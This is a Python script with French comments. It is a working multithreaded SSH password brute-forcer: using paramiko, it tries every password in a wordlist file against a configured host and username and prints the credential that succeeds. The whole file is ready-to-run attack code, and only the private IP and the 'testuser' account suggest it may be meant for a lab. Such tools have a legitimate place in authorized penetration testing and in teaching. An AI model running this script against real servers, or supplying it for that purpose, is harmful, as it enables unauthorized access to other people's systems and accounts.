import paramiko
import threading
from queue import Queue

# Configuration
target_host = "192.168.1.100"  # IP de la machine cible
target_port = 22               # Port SSH
username = "testuser"          # Nom d'utilisateur SSH
password_file = "passwords.txt"
thread_count = 10

# Contrôle global
found = False
lock = threading.Lock()

def ssh_connect(password):
    global found

    if found:
        return

    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
    try:
        ssh.connect(target_host, port=target_port, username=username, password=password, timeout=5)
        with lock:
            if not found:
                found = True
                print(f"[✔] Mot de passe trouvé : {password}")
    except paramiko.AuthenticationException:
        print(f"[✘] Échec : {password}")
    except Exception as e:
        print(f"[!] Erreur : {e}")
    finally:
        ssh.close()

def worker(queue):
    while not queue.empty() and not found:
        password = queue.get()
        ssh_connect(password)
        queue.task_done()

def main():
    password_queue = Queue()

    # Charger les mots de passe dans la file
    with open(password_file, 'r') as f:
        for line in f:
            password_queue.put(line.strip())

    threads = []
    for _ in range(thread_count):
        t = threading.Thread(target=worker, args=(password_queue,))
        t.start()
        threads.append(t)

    # Attendre que tous les mots de passe soient testés
    password_queue.join()

    if not found:
        print("[×] Aucun mot de passe valide trouvé.")

if __name__ == "__main__":
    main()
